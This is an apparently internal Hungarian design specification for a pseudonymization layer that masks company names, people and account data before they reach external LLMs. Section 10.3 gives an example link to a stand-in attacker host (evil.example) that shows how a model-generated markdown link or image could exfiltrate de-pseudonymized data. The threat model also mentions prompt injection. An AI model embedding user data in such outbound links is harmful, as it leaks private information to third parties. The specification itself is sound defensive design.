# AI Privacy Gateway — koncepcióspecifikáció

**Pszeudonimizációs (tokenizációs) és feloldó réteg külső LLM-ek felé irányuló adatfolyamokhoz**

| | |
|---|---|
| **Verzió** | **v0.2** — a v0.1 koncepció + a 2026-08-19-i review beépítve (R1–R23 elfogadva, D1–D6 eldöntve) |
| **Státusz** | koncepció — nem implementált |
| **Dátum** | 2026-08-19 |
| **Issue** | #272 (ez a spec), #189 (beolvad, ld. D6) |
| **Kapcsolódó spec** | `docs/AI-Agent-Platform-Feature-Spec-Sensitivity-Router.md`, `docs/specs/sensitivity-router-redesign-spec.md`, **forrásrendszer-szerződés:** [`ai-privacy-source-system-contract.md`](./ai-privacy-source-system-contract.md) |
| **Érintett kód** | `app/src/domain/gateway/model-gateway.ts`, `app/src/domain/gateway/sensitivity-router.ts`, `app/src/domain/gateway/prompt-cache.ts`, `app/src/domain/tool-broker/`, `app/src/domain/contract-runtime/`, `app/src/domain/agent/chat-tool-loop.ts`, `app/src/domain/channel/` |

**Cél:** a modellek és modellüzemeltetők felé történő érzékeny adatkitettség érdemi csökkentése úgy, hogy az AI agentek használhatósága és üzleti kontextusa a lehető legnagyobb mértékben megmaradjon.

> A v0.1 → v0.2 változások tételes listája a **§22 Változásnaplóban**.

---

## 1. Cél és alapfilozófia

A rendszer nem teljes anonimizálást és nem új access-control réteget kíván létrehozni. A privacy boundary az AI Agent Platform megbízható környezete és a külső LLM között húzódik.

> **Alapelv:** a pszeudonimizáció azt szabályozza, hogy az LLM mit láthat; nem azt, hogy a felhasználó mit láthat.

A user, a forrásalkalmazások, az AI Agent Platform, a surrogate vault és a platform normál infrastruktúrája trusted zone. A külső LLM/API szolgáltató a privacy boundary túloldalán van.

A megoldás kockázatcsökkentő, best-effort rendszer. Nem ígéri, hogy egy LLM soha semmilyen azonosítható adatot nem láthat, hanem determinisztikusan védi azt, amiről a rendszer strukturálisan tudja, hogy védendő, és best-effort védi a bizonytalan, szabad szöveges eseteket.

**Jogi keret (R13).** A művelet a GDPR 4. cikk 5. pontja szerinti **pszeudonimizálás**, nem anonimizálás: a pszeudonimizált adat továbbra is személyes adat, a leképezés pedig az a „kiegészítő információ", amelyet elkülönítve, technikai és szervezési intézkedésekkel védve kell tartani. A réteg a 32. cikk szerinti megfelelő technikai intézkedés — **nem váltja ki** az LLM-szolgáltatóval kötött adatfeldolgozói szerződést, az adatkezelési tájékoztatót vagy a rekord-nyilvántartást.

## 2. Viszony a meglévő sensitivity routerhez (R1)

A platformban **már fut egy privacy-döntéspont** ugyanazon a hívásláncon. Ez a feature nem párhuzamos réteg, hanem annak kibővítése.

| Meglévő elem | Hol | Mit csinál ma |
|---|---|---|
| `inspectPromptSensitivity` / `classifyPrompt` | `sensitivity-router.ts` | determinisztikus osztályozás (regex + Luhn + IBAN mod-97): `clean` / `sensitive` / `forbidden`, pozícióval és maszkolt snippettel |
| Policy-végrehajtás | `model-gateway.ts` | `sensitive` → helyi modell kényszerítése (fail-closed, ha nincs helyi modell); `forbidden` → blokk + `model.call.denied` audit + emberi override |
| Per-agent felmentés | `agents.allow_sensitive_external_model` | mindent-vagy-semmit kapcsoló, csak a `sensitive` szintre |
| Kimenő redakció | `redactSensitiveText`, `StreamingSensitiveTextRedactor` | reasoning-trace és debug-export maszkolása — **egyirányú**, nem visszafejthető |

**Kategória-szintű policy.** A privacy-döntés minden entitás-/mintakategóriára (`company`, `person`, `email`, `phone`, `account`, `taj`, `adoszam`, `pan`, `iban`, `secret_key`, tenant-egyedi minták) egy akciót ad:

```
allow | tokenize | local_only | block
```

- Ez váltja fel a mai `allow_sensitive_external_model` mindent-vagy-semmit kapcsolót (a kapcsoló migrációval kategória-policyvé képződik le).
- A `secret_key` (privát kulcs, API token) **soha nem `tokenize`** — ott a pszeudonimizálásnak nincs üzleti értelme, marad `block`.
- A `pan` / `iban` `allow` értéke superadmin-jog és külön megerősítés mögött marad (a mai `forbidden` invariáns nem gyengül).

**Végrehajtási sorrend a gateway-ben.** A pszeudonimizáció **előbb** fut, az osztályozó a már pszeudonimizált szövegen dönt:

```
messages
  │
  ├─ 1. Privacy transform (ÚJ)      → surrogate-csere a policy szerint
  │
  ├─ 2. Sensitivity classify (MA)   → a maradékon: clean / sensitive / forbidden
  │
  ├─ 3. Guardrail + routing (MA)    → hívásszám-plafon, provider-feloldás
  ▼
external provider
```

Két haszna van: (a) nem keletkezik két, egymással versengő privacy-döntéspont; (b) megszűnik a redesign-spec P5 UX-csapdája — ma egyetlen e-mail-cím véglegesen `sensitive`-be billenti a beszélgetést, pszeudonimizálva viszont már nem.

## 3. Fő architektúra (R20)

Az elemek a meglévő modulokra képződnek le, nem új, párhuzamos komponensek:

```
User / Source Systems
        │
        ▼
Trusted AI Agent Platform
  ├─ Connector Privacy Metadata   → connector `config` / ConnectorSpecVersion capabilitySet
  ├─ Entity Resolver (best effort)→ connector `resolve()` + tenant entitás-szótár
  ├─ Privacy Policy Engine        → kategória-policy (PlatformSetting → tenant → agent)
  ├─ Surrogate Engine + Vault/KMS → új modul: domain/privacy/
  └─ Privacy transform            → ModelGateway.call() 1. lépése (§2)
        │  raw → pszeudonimizált
        ▼
     External LLM
        │  pszeudonimizált válasz / tool call
        ▼
Trusted Platform
        ├─ tool-arg feloldás      → ToolBrokerService.invoke() előtt (§10.1)
        └─ megjelenítési feloldás → chat UI / channel adapter (§10.2)
        ▼
User / Application UI
```

A mechanika platformszintű. A forrásrendszer domain tudást, mezőszintű privacy metadata-t, stabil belső azonosítókat és – ahol támogatott – entity resolution képességet ad.

## 4. Felelősségi határok

| Komponens | Felelősség |
|---|---|
| AI Agent Platform | Surrogate-formátum, képzés, felismerés, validáció, scope, vault/KMS, LLM-bound adatfolyamok privacy transzformációja, feloldás vezérlése, egress-mátrix. |
| Forrásrendszer / connector | Megjelöli a védendő strukturált mezőket, entitástípust és stabil source ID-t; opcionálisan entity resolutiont és privacy hint-eket biztosít. |
| Forrásalkalmazás | Saját felhasználói jogosultságai és access control. Ezt a privacy gateway nem duplikálja. |
| LLM | Kizárólag surrogate-okkal dolgozik; nem kap feloldó képességet, és nem kérhet feloldást. |
| UI / channel adapter | A trusted oldalon a felhasználónak valódi adatot jeleníthet meg az egress-mátrix szerint, és opcionálisan vizualizálja a privacy transzformációt. |

## 5. Surrogate-modell

**Terminológia (R16).** A kódbázisban a „token" szó már négy dolgot jelent (LLM-token / `model_calls.prompt_tokens`, `WriteGateToken`, `ChannelLinkToken`, OAuth-token). A privacy-oldali helyettesítő neve ezért **surrogate** (magyarul: álnév), a leképezés `surrogate_map`, a modul `domain/privacy/`. A UI-ban „álnév" néven jelenik meg.

**Formátum (R9, D1).** Opaque véletlen azonosító helyett **típusos, rövid, beszélgetésen belül sorszámozott** álnév:

```
[[COMPANY_1]]   [[PERSON_2]]   [[EMAIL_3]]   [[ACCOUNT_1]]
```

Indok: az opaque karakterlánc (a) elveszíti az entitás típusát a modell számára, (b) sok BPE-tokent fogyaszt (költség + kontextusablak), (c) olvashatatlan a debug-nézetben. A típusos alak mindhármat javítja, és a modell a mondatszerkezetet is helyesen tudja felépíteni köré.

**Opcionális kontextus-hint.** Policy-vezérelten az első előforduláskor egy nem azonosító típusleírás adható a modellnek (`COMPANY_1 = kiskereskedelmi lánc, HU`). Ez tudatos csere: kevés kontextus-szivárgás jobb válaszminőségért. Alapértelmezés: **kikapcsolva**; entitástípusonként engedélyezhető.

**Hitelesség és névtér (R10).**

- A leképezés `(tenantId, conversationId | traceId, entityRef) → surrogate` **bijektív** a scope-on belül.
- A feloldás **kizárólag vault-találaton** múlik, soha nem a surrogate alakján — így a modell által „kitalált" álnév (`[[COMPANY_99]]`) definíció szerint feloldhatatlan.
- A vault oldalán a rekord HMAC-cel hitelesített (tenant-kulcs); a HMAC **nem** kerül a surrogate szövegébe.
- Ismeretlen álnév feloldási kísérlete `privacy.surrogate.unknown` audit-eseményt ír, és a §15 szerinti hibakezelést indítja.

**Scope.** A belső entitásazonosság tartós, de a külső felé adott surrogate alapértelmezésben **conversation-scoped** (debug-trace esetén trace-scoped). Ugyanaz az entitás külön beszélgetésekben eltérő álnevet kap, csökkentve a beszélgetések közötti korrelálhatóságot. Egy beszélgetésen/trace-en belül a leképezés konzisztens.

**Perzisztencia (R19).** A leképezés **perzisztens**, nem futásidejű memória. Enélkül a ticket-retry, az agent-turn resilience újrafuttatás és a beszélgetés újranyitása után az előzményben lévő korábbi álnevek feloldhatatlanná válnának. A mapping élettartamát a §6 retention szabályozza.

## 6. Vault, kulcskezelés, retention

**Kétféle surrogate-osztály (R2, D2).** A naiv „vault = értékmásolat" modell egy **második PII-példányt** hozna létre. Helyette:

| Osztály | Mit tárol | Mikor keletkezik |
|---|---|---|
| **ref-surrogate** | csak referencia: `(tenantId, connectorId, entityType, sourceId)` — **nyers érték nélkül** | ha a connector stabil source ID-t ad (§7 fő eset) |
| **val-surrogate** | titkosított értékmásolat (tenant-kulcs + per-conversation adatkulcs) | csak ha nincs source ID: szabad szöveges találat, user-input, NER (§8–9) |

A ref-surrogate feloldása a forrásból (vagy a fordulón belül még meglévő nyers tool-válaszból) történik → nem növeli a PII-felületet, és a **forrásoldali törlés automatikusan átüt** a feloldáson (GDPR törlési jog).

**Kulcskezelés.** Első verzióban platformoldali vault/KMS, tenantonkénti erős izolációval; per-conversation adatkulcs a val-surrogate-okhoz. Későbbi enterprise opció: ügyfél- vagy forrásoldali kulcskezelés (BYOK).

**Retention és törlés (R15).** A meglévő sémára kötve, új retention-fogalom bevezetése nélkül:

- a mapping élettartama a beszélgetés retention-jét követi: `RetentionPolicy`, `Conversation.retainUntil`, `Conversation.legalHold`;
- beszélgetés törlésekor (`Message.contentDeletedAt` / retention-járat) a **per-conversation adatkulcs törlődik** → a val-surrogate-ok kriptográfiailag visszafejthetetlenné válnak (crypto-shredding);
- a ref-surrogate eleve nem tárol értéket, így ott a forrásoldali törlés a mérvadó;
- legal hold alatt álló beszélgetésnél a kulcs megmarad.

## 7. Strukturált adatok pszeudonimizálása

Ez a legerősebb, determinisztikus védelmi réteg. A connector sémája jelzi, mely mezőket kell pszeudonimizálni.

```json
{
  "company_name": {
    "privacy": "tokenize",
    "entity_type": "company",
    "source_id": "crm/company/4821"
  },
  "revenue": {
    "privacy": "pass"
  }
}
```

A tool response még az LLM contextbe kerülés előtt áthalad a privacy transzformáción. A védendő mezők értéke helyett surrogate kerül a modellhez, miközben a feladathoz szükséges nem védett üzleti adatok – például forgalmi számok – megmaradhatnak.

**Sorrend a contract-runtime-hoz képest (R6).** A tool-output szigorú séma-validációja (`domain/contract-runtime/`) a **nyers** válaszon fut; a pszeudonimizáció **utána**, közvetlenül a modell-hívás előtt. Enélkül egy `email` formátumú mezőbe tett `[[EMAIL_3]]` elbukna a formátum-validáción. További szabályok:

- surrogate mindig **string mezőben** marad; numerikus és dátum mezőt nem pszeudonimizálunk (ott `pass` vagy `block`), mert az elrontja a downstream parszolást és a modell számtani érvelését;
- a contract-runtime a pszeudonimizált mezőkre nem kényszerít formátum-constraintet (a transzformáció a validáció után történik, így ez természetesen adódik);
- tömbök/ismétlődő rekordok esetén a mezőnkénti leképezés stabil marad a válaszon belül.

## 8. Szabad szöveg kezelése

Három egymásra épülő szint:

1. **Schema-based:** strukturált mezőknél determinisztikus (§7).
2. **Known-value substitution:** ha egy strukturált mezőből már ismert egy védett érték, ugyanazon adatcsomag szabad szövegében is lecserélhető.
3. **Privacy scanner:** e-mail, note, dokumentumszöveg stb. esetén best-effort felismerés a meglévő determinisztikus mintakészletre építve (e-mail, telefon, IBAN, PAN, TAJ, adószám) + tenant-egyedi minták.

**Magyar nyelvi illesztés (R11, D4-hez kapcsolódóan).** A 2. szint nem lehet exact match: magyarul az entitásnév ragozódik (*SPAR-nak, SPAR-ral, Sparnál, a Sparban*). A v1 illesztés:

- normalizálás (kisbetűsítés, ékezet-tűrés, elválasztójel-normalizálás),
- toldalék-tolerancia (szótő + magyar ragmorféma-lista, kötőjeles toldalékolással),
- szótár-illesztés Aho–Corasick automatával a tenant entitásnevein (skálázik több ezer névre),
- szóhatár-ellenőrzés a hamis pozitívok ellen.

**ML-alapú NER nélkül** — determinisztikus, olcsó (nulla LLM-token) és auditálható, összhangban a Sensitivity-Router spec elvével. ML-NER legfeljebb későbbi fázis, mérési eredmény alapján.

A 3. szint hibája alapértelmezésben nem állítja meg a workflow-t (§15 fail-open szabály). A cél a kitettség csökkentése, nem a használhatóság feláldozása.

## 9. User input és entity resolution

A CRM-specializált agentnél indokolt, hogy a privacy resolver alapértelmezetten fusson. A prompt előtti entity recognition azonban best-effort.

Példa: *„Készíts kimutatást a SPAR idei forgalmáról."*

- Ha a resolver nagy bizonyossággal felismeri az entitást, a platform még az LLM előtt surrogate-re cseréli.
- A platform nem tart fenn minden connector minden entitásához globális alias-adatbázist.
- A platform candidate extractiont végez, a tényleges feloldást a forrásrendszer/connector `resolve()` interfésze adja.
- Ha a prompt előtti felismerés sikertelen, a nyers név továbbmehet az LLM-hez. Ez **elfogadott, dokumentált maradékkockázat** (§16).

### Második védelmi vonal: tool boundary

Ha az LLM később strukturált tool callban használja a nevet — `get_revenue(company="SPAR")` —, a platform újra megkísérli a forrásoldali feloldást. Siker esetén a tool művelet stabil source ID-val történik, és a beszélgetés további részében már surrogate használható.

> **Szabály:** user-input pszeudonimizáció = best effort; strukturált tool-output pszeudonimizáció = mandatory/deterministic, amennyiben a connector megfelelő privacy metadata-t biztosít.

## 10. Feloldás (detokenizáció): hol szabad és hol nem

**Invariáns (R3).** Feloldás **pontosan két helyen** történhet, és soha nem az LLM kérésére:

### 10.1 Tool-argumentum feloldás

Ha az LLM tool callban adja vissza az álnevet — `get_revenue(company="[[COMPANY_1]]")` —, a platform a **connector-hívás előtt**, szerveroldalon feloldja (`ToolBrokerService.invoke()` előtt, a broker authorizer után). Enélkül minden pszeudonimizált entitáson elhasal a tool-hívás.

- A feloldott nyers érték a tool-hívás argumentumába kerül, **nem** a modell contextjébe.
- A tool-call audit (`ToolCall.argsMeta`) a surrogate-alakot naplózza, nem a nyers értéket.
- Ismeretlen álnév → a tool-hívás kontrollált hibával tér vissza, a modell javíthat (§15).

### 10.2 Megjelenítési feloldás — egress-mátrix (R4)

A „trusted UI" nem az egyetlen kimenet: a platform Telegram-csatornán, platform e-mailben, ticket-kommentben, export/riport fájlban és debug-log exportban is kiad szöveget — ezek egy része a bizalmi határon **kívülre** megy. Alapértelmezett mátrix (tenant-szinten szigorítható):

| Egress | Feloldás |
|---|---|
| Web UI (bejelentkezett, tenant-scope, jogosult résztvevő) | teljes |
| Telegram / külső csatorna | entitástípusonként (D3): `company` engedhető, `person` / `email` / `account` alapból **nem** |
| Platform e-mail-értesítés | alapból **nem** |
| Export / riport fájl | policy szerint, auditált eseménnyel |
| Debug-log export, audit log, model_calls napló | **soha** |

### 10.3 Renderelési biztonság (R5)

A pszeudonimizáció bevezetése **új exfiltrációs utat nyit**: ha a modell az álnevet URL-be, markdown-link célba vagy képhivatkozásba ágyazza (`https://evil.example/?c=[[COMPANY_1]]`), a naiv „cseréld vissza a végén" logika a nyers értéket teszi egy aktív linkbe, amit a felhasználó kattintása vagy egy auto-betöltő kép kivisz.

Szabályok:

- feloldás **csak szöveg-node-ban**; URL-ben, markdown-link célban, HTML-attribútumban és kódblokkban az álnév **jelölve marad** (és a UI jelzi, hogy ott feloldatlan érték van);
- a markdown-renderelő sanitizálása (külső kép- és link-célok kezelése) előfeltétel;
- a szabály megsértése regressziós teszttel fedett (red-line eset).

### 10.4 Streaming feloldás (R8)

A válasz SSE-deltákban érkezik, az álnév karakterei **több delta között szétszakadhatnak**. A feloldó ugyanazt a pufferelési mintát követi, amit a `StreamingSensitiveTextRedactor` már megvalósít: a `[[` nyitó szekvenciától a záró `]]`-ig visszatartás, korlátos pufferrel és a forduló végén ürítéssel. Töredék álnév soha nem jelenhet meg a felhasználónak.

### 10.5 Feloldási scope-invariáns (R14)

Nem építünk új jogosultsági modellt (§14 nem cél), de a vault-lookup nem lehet globálisan címezhető. Feloldás csak akkor engedélyezett, ha **mindhárom** teljesül:

1. azonos tenant,
2. azonos conversation/trace scope,
3. a kérő felhasználó a beszélgetés jogosult résztvevője (a meglévő conversation-hozzáférés szerint).

Ha a felhasználó a forrásalkalmazás jogosultsági modellje szerint nem fér hozzá az adathoz, azt továbbra is a forrásalkalmazás dönti el — a privacy gateway ezt nem duplikálja, csak a fenti három technikai feltételt kényszeríti ki.

## 11. Privacy Interface Contract csatlakoztatott rendszerekhez

A platform szabványos privacy interfészt definiál; a connectorok capability-alapon implementálják.

**Forrásrendszer-csapatnak odaadható szerződés** (katalógus API, payload-invariánsok, `resolve`, admin-UI ajánlás): [`ai-privacy-source-system-contract.md`](./ai-privacy-source-system-contract.md). Ez a fejezet a platformoldali összefoglaló; a kanonikus elvárások ott élnek.

### Elvárt / ajánlott képességek

- Védendő strukturált mezők deklarálása.
- Entitástípus megadása: `company`, `person`, `email`, `phone`, `account`.
- Stabil belső/source azonosító biztosítása (ez teszi lehetővé a ref-surrogate-ot, §6).
- Opcionális privacy metadata és free-text hint-ek.
- Opcionális `resolve(text, entity_type?)` interface: találat / több találat / nincs találat.
- A tool API-k lehetőség szerint belső ID-val dolgozzanak, ne megjelenítési névvel.

### Capability deklaráció

```json
{
  "structured_field_privacy": true,
  "stable_entity_ids": true,
  "entity_resolution": true,
  "free_text_hints": false
}
```

A deklaráció verziózott (a connector `ConnectorSpecVersion` capabilitySet-jébe illeszkedik), és a változása auditált. Legacy vagy külső connector privacy interface nélkül is működhet, de a platform kisebb védelmi szintet jelez a UI-ban és az auditban. A saját CRM a teljes contract referenciaimplementációja.

## 12. Minden LLM-bound adatfolyam közös úton

A privacy mechanizmus nem csak a normál agent contextre vonatkozik. Bármely adatfolyam, amely külső LLM-hez kerül, ugyanazon a transzformáción halad át:

- agent prompt/context (`user`, `assistant`, `tool` üzenetek),
- **memória-chunkok** (ma `system` üzenetként injektálva) — **igen, ezek is** (D4): különben megmarad a redesign-spec P4 szerinti osztályozatlan rés,
- tool response,
- debugging trace és log projection,
- AI-alapú hibakeresés,
- későbbi evaluation vagy elemző workflow-k.

**Tárolás nyersen, transzformáció a határon (R18).** A `messages`, `tool_calls` és log-rekordok a trusted zónában **nyersen** tárolódnak; a pszeudonimizáció minden fordulóban a kimenő határon fut újra, beszélgetés-szintű entitástérkép-cache-sel. Így a tárolt előzmény nem ragad be feloldhatatlan formában, és a §6 retention marad az egyetlen törlési mechanizmus.

**Prompt-cache invariáns (R7).** Conversation-scoped surrogate **nem kerülhet** megosztott, cache-elt prefixbe (skill-szöveg, közös rendszerinstrukció). A pszeudonimizált tartalom mindig a cache-határ **utáni**, nem megosztott szegmensben van. Ellenkező esetben cache-szennyezés és rossz feloldás keletkezik.

**Debug-trace.** A platform megtarthat teljes, nyers logokat a trusted zónában. Ha azonban egy debugging AI elemzi őket, a `get_debug_trace()`-szerű API pszeudonimizált projectiont ad. Nem szükséges külön privacy-log adatbázist fenntartani. Egy trace-en belül ugyanaz az entitás konzisztensen ugyanazt az álnevet kapja, hogy a debugging modell követni tudja az eseményláncot.

## 13. Üzemmódok és rollout

Konfigurációs hierarchia: **platform master switch → tenant/szervezet default → agent szintű override** (a meglévő `PlatformSetting` kill-switch mintára).

| Mód | Viselkedés |
|---|---|
| **OFF** | A privacy transzformáció nem fut. |
| **OBSERVE / DRY-RUN** | A rendszer megállapítja és logolja, mit pszeudonimizálna, de az LLM-bound adatot nem módosítja. |
| **ENFORCE** | A konfigurált privacy transzformáció ténylegesen érvényesül. |

Ez lehetővé teszi a fokozatos pilotot, a regressziótesztet és a gyors visszaállást, ha a modul egy workflow-t akadályoz. A kategória-policy (§2) minden módban ugyanaz; a mód csak azt szabályozza, hogy a döntés érvényesül-e.

## 14. Privacy Observability és vizuális debugging

A UI opcionálisan megjelölheti azokat a természetes nyelvi részleteket, amelyek az LLM felé pszeudonimizálva mentek, vagy OBSERVE módban mentek volna:

- a user a valódi értéket látja, például „SPAR Magyarország";
- szín/kiemelés jelzi a védett entitást;
- hover vagy debug panel mutatja az entitástípust és a transzformáció státuszát;
- normál usernek nem szükséges a technikai álnév megjelenítése.

Admin/debug nézetben hasznos lánc:

```
Original input
   ↓
Privacy transformation
   ↓
Actual LLM input
   ↓
LLM output
   ↓
Feloldott user output
```

OBSERVE módban ez a felület alkalmas a false positive és false negative esetek gyors felderítésére. A meglévő `inspectPromptSensitivity` már ma maszkolt snippetet és pozíciót ad vissza — a felület erre építhető.

## 15. Hibakezelés, latency, fail-open / fail-closed

**Alapelvek.**

- A rendszer degradálódjon, ne omoljon össze.
- A bizonytalan user-input felismerés ne okozzon folyamatos hibaüzeneteket.
- Nem létező vagy sérült álnév nem oldható fel; a platform validálja, auditálja (`privacy.surrogate.unknown`), és szükség esetén kontrolláltan visszajelez a modellnek javításra.
- Minden privacy-esemény a hash-láncolt auditba kerül: kategória, akció, érintett spanek száma, scope — **soha a nyers érték**.

**Latency-budget (R12).** A transzformáció a kritikus úton van, nagy tool-válaszoknál (több ezer soros CRM-lista) érzékelhető:

- célérték: **p95 ≤ 50 ms / 100 KB szöveg**, teljes forduló-overhead p95 ≤ 80 ms;
- vault-írás fordulónként batchelve, egy tranzakcióban;
- beszélgetés-szintű entitástérkép-cache (a history append-only, így a már feldolgozott prefix eredménye újrahasznosítható).

**Timeout / hiba esetén (R12) — ez válaszolja meg a v0.1 §17 nyitott fail-open kérdését:**

| Réteg | Viselkedés hibánál |
|---|---|
| Strukturált, explicit módon jelölt mező (§7) | **fail-closed** — a modellhívás megáll, audit + emberi visszajelzés. Inkább hibázzon, mint hogy nyersen kimenjen. |
| Known-value substitution (§8/2) | fail-closed, ha a forrásérték strukturált mezőből származik; egyébként fail-open. |
| Best-effort scanner / user-input resolver (§8/3, §9) | **fail-open** + audit — a workflow nem áll meg. |
| Vault elérhetetlen | fail-closed minden pszeudonimizált útra (a feloldás sem működne). |

## 16. Fenyegetésmodell és maradékkockázat (R21)

**Mi ellen véd:**

- modellszolgáltatói adatmegőrzés és esetleges tréning-felhasználás;
- szolgáltatóoldali incidens, jogosulatlan belső betekintés, subprocesszor-lánc;
- a modellszolgáltató naplóiba került kontextus kiszivárgása;
- a platform saját debug/AI-hibakeresési útján történő másodlagos kitettség.

**Mi ellen nem véd:**

- **prompt injection** — a modell a nála lévő tartalmat kiadhatja, de az pszeudonimizált; a védelem értéke épp ez;
- **aggregált újraazonosítás** — a §7 szerint bent maradó forgalmi számok + iparág + időszak együtt azonosíthat egy céget; ez tudatos csere az üzleti használhatóságért;
- a felhasználó tudatos, saját kezű adatbeírása, ha a resolver nem ismeri fel (§9);
- a nem pszeudonimizált szabad szöveg (best-effort réteg, mért recall-lal, §20);
- csatolmányok (PDF, kép) tartalma (§17).

**Elfogadott maradékkockázat:** a §9 szerinti user-input leakage. Ezt üzletileg is vállalni kell, és a termékkommunikációban nem szabad elfedni (§18).

## 17. Nem célok

- Teljes, visszafejthetetlen anonimizálás.
- A forrásrendszerek access-control modelljének lemásolása.
- Garancia arra, hogy semmilyen személyes vagy üzleti adat soha nem jut LLM-hez.
- Minden connector összes entitásának és aliasának központi platformoldali replikálása.
- Az üzletileg szükséges numerikus vagy kontextuális adatok automatikus elrejtése pusztán azért, mert érzékenyek lehetnek.
- **Csatolmányok (PDF, kép) tartalmának pszeudonimizálása (R17, D5).** A szöveges transzformáció ezekre nem működik; a v1-ben rájuk a meglévő sensitivity-policy (blokk / emberi jóváhagyás) marad érvényben. OCR-alapú kiterjesztés külön fázis.
- ML-alapú NER a v1-ben (§8).

## 18. Biztonsági és termékállítás

A termék állítása nem az, hogy „az LLM nem kap adatot", hanem hogy **az LLM csak a feladat elvégzéséhez szükséges adatot kapja meg, miközben a konfigurált azonosító és érzékeny entitásadatok determinisztikusan vagy best-effort módon pszeudonimizálhatók**.

Pontos, jogilag védhető megfogalmazás (R13):

> „A személyes adatok pszeudonimizált formában kerülnek a külső modellhez. Ez a GDPR 32. cikke szerinti megfelelő technikai intézkedés, **nem anonimizálás**: a leképezés a platform bizalmi zónájában, elkülönítve és titkosítva marad."

Ez csökkenti egy modelloldali adatmegőrzés, incidens vagy jogosulatlan betekintés következményeit, miközben a pénzügyi, elemzési és operatív agent-workflow-khoz szükséges kontextus megtartható. Az LLM-szolgáltatóval kötött DPA és az adatkezelési dokumentáció ettől függetlenül szükséges.

## 19. Implementációs sorrend — vertikális szeletek (R23)

A v0.1 rétegenkénti sorrendje helyett végponttól végpontig futó szeletek, hogy minden mérföldkő demózható és mérhető legyen.

**M1 — vertikális MVP (D5).**
- Saját CRM connector + **egyetlen entitástípus: `company`**.
- Surrogate Engine + vault (ref-surrogate; val-surrogate még nem kell).
- Strukturált tool-output pszeudonimizáció (§7), a contract-validáció után.
- Tool-argumentum feloldás a brokerben (§10.1).
- Web UI feloldás, streaming-biztos (§10.2, §10.4) + renderelési szabály (§10.3).
- OBSERVE mód + audit + alap observability.
- Egy agenten, egy tenanton.

**M2 — policy és összevonás.**
- Kategória-policy (`allow|tokenize|local_only|block`) platform → tenant → agent hierarchiával.
- ENFORCE mód; a mai `allow_sensitive_external_model` migrációja.
- A sensitivity-routerrel közös végrehajtási sorrend (§2), regressziós fedéssel.
- Admin UI + dry-run teszter.

**M3 — szabad szöveg és user input.**
- Known-value substitution magyar toldalék-tűrő illesztéssel (§8).
- User-input resolver + connector `resolve()` contract (§9, §11).
- val-surrogate + per-conversation adatkulcs + crypto-shredding (§6).

**M4 — kiterjesztés.**
- Debug-trace projection (§12), privacy observability UI (§14).
- Egress-mátrix a csatornákra (§10.2), memória-chunk lefedés (§12).
- További entitástípusok és connectorok, capability-verziózás.

## 20. Elfogadási kritériumok és mérőszámok

### Funkcionális kritériumok (v1 / M1–M2)

- Egy privacy metadata-val jelölt strukturált mező nyers értéke ENFORCE módban nem kerül az LLM requestbe.
- Az LLM ugyanazt az álnevet konzisztensen használhatja egy conversation/trace scope-on belül; újrafuttatás után is ugyanazt kapja (R19).
- A modell által kitalált álnév nem oldható fel, és auditált eseményt ír (§5).
- Tool callban visszaadott álnév a connector-hívás előtt feloldódik, és a nyers érték nem kerül vissza a modell contextjébe (§10.1).
- A user a trusted UI-ban feloldott, természetes outputot kap; külső csatornán az egress-mátrix érvényesül (§10.2).
- URL-be/kódblokkba ágyazott álnév nem oldódik fel (§10.3) — red-line regressziós teszttel.
- Streamelt válaszban töredék álnév soha nem jelenik meg (§10.4).
- OBSERVE módban a rendszer a workflow módosítása nélkül megmutatja, mit pszeudonimizált volna.
- Agentenként ki-/bekapcsolható a funkció.
- AI debugging esetén a raw log helyett pszeudonimizált projection megy a modellnek.
- Privacy Interface nélküli connector továbbra is használható, de a platform egyértelműen alacsonyabb privacy capability-t kezel.

### Mérőszámok (R22)

A meglévő `Eval` / `EvalRun` modellekre és a `prompt-eval-red-lines` keretre építve:

| Metrika | Cél v1-ben |
|---|---|
| Strukturált, jelölt mező recall | 100% (definíció szerinti, teszttel bizonyítva) |
| Szabad szöveges recall (címkézett magyar mintán) | ≥ 80% |
| False positive ráta (pszeudonimizált, de nem védendő) | ≤ 5% |
| Latency overhead (p95, teljes forduló) | ≤ 80 ms |
| Workflow failure rate változása OBSERVE → ENFORCE | ≤ +1% |
| **Válaszminőség-romlás pszeudonimizált prompton (eval-szett)** | ≤ 5% |
| Ismeretlen/érvénytelen álnév aránya a modell outputjában | ≤ 1% |

Az utolsó előtti sor kiemelten fontos: a pszeudonimizáció **ronthatja a modell válaszminőségét** — ezt mérni kell, nem feltételezni. Ez dönti el a §5 kontextus-hint bekapcsolását is.

## 21. Eldöntött kérdések és még nyitott technikai részletek

### Eldöntve (2026-08-19)

| # | Kérdés | Döntés |
|---|---|---|
| **D1** | Álnév formátuma | Típusos, rövid, sorszámozott: `[[COMPANY_1]]`. Kontextus-hint opcionális, alapból ki (§5). |
| **D2** | Vault-modell | Kettős: ref-surrogate ahol van source ID, val-surrogate csak szabad szövegre (§6). |
| **D3** | Külső csatornán feloldunk-e | Entitástípusonként; `person` / `email` / `account` alapból nem (§10.2). |
| **D4** | Memória-chunkok pszeudonimizálása | Igen — a `system`-üzenetként injektált memória is a transzformáción megy át (§12). |
| **D5** | v1 hatókör | Saját CRM + `company` entitástípus, vertikális MVP (§19/M1). |
| **D6** | Issue #189 sorsa | Beolvad ebbe (#272); a #189 a val-surrogate speciális esete, de perzisztens mappinggel. |

### Még nyitott (implementáció közben eldöntendő)

- A vault fizikai technológiája (külön tábla + KMS-envelope vs. dedikált secret store) és a garbage collection járat ütemezése.
- A magyar toldalék-lista pontos terjedelme és a szótár-frissítés (connector-oldali entitásnév-szinkron) ütemezése.
- Confidence thresholdok a `resolve()` találatoknál és a többértelmű entity resolution UX-e (kérdezzen vissza vagy hagyja nyersen?).
- A kategória-policy tárolási helye: `PlatformSetting` kulcs vs. dedikált tábla (a redesign-spec D1-e ugyanez) — a mintakészlet verziózása auditálandó.
- A `local_only` célmodell tenant-szintű választhatósága és elnevezése (`sensitiveTarget`), a redesign-spec P3 szerint.
- Az egress-mátrix felületi konfigurálhatósága (tenant admin vs. superadmin).

## 22. Változásnapló — v0.1 → v0.2

| Review-tétel | Hova került |
|---|---|
| R1 — a sensitivity-router negyedik akciója, végrehajtási sorrend | §2 (új fejezet) |
| R2 — ref/val surrogate kettősség | §6 |
| R3 — tool-argumentum feloldás | §10.1 |
| R4 — egress-mátrix (Telegram, e-mail, export, log) | §10.2 |
| R5 — renderelési exfiltráció (URL/attribútum/kódblokk) | §10.3 |
| R6 — contract-runtime sorrend és típus-szabályok | §7 |
| R7 — prompt-cache invariáns | §12 |
